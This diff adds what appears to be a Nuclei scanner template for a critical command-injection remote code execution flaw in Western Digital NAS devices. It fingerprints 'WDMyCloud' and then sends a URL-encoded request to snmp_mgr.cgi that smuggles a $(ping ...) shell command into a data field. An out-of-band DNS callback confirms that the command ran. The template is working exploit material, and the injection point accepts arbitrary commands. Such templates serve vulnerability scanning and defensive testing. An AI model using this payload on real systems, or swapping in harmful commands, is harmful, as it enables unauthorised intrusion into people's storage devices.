@@ -1,0 +1,45 @@
+id: poc-western-digital-nas-cgi-snmpv3-rce
+info:
+  name: "Western-Digital-NAS-CGI-snmp_mgr.cgi SNMPv3远程代码执行漏洞"
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: Western-Digital-NAS
+
+variables:
+  domain: "{{interactsh-url}}"
+
+flow: |
+  http(1) && http(2)
+
+http:
+  - id: initial-check
+    method: GET
+    path:
+      - "{{BaseURL}}/"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "WDMyCloud"
+
+  - id: exploit-request
+    method: GET
+    path:
+      - "{{BaseURL}}/cgi-bin/snmp_mgr.cgi?cmd=cgi_SNMPv3_modify_one_record&data=%3Ca%20id=0%3E%3Ccell%3E%24(ping%20{{domain}})%3C/cell%3E%3C/a%3E&data_len=103"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - ""
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "dns"
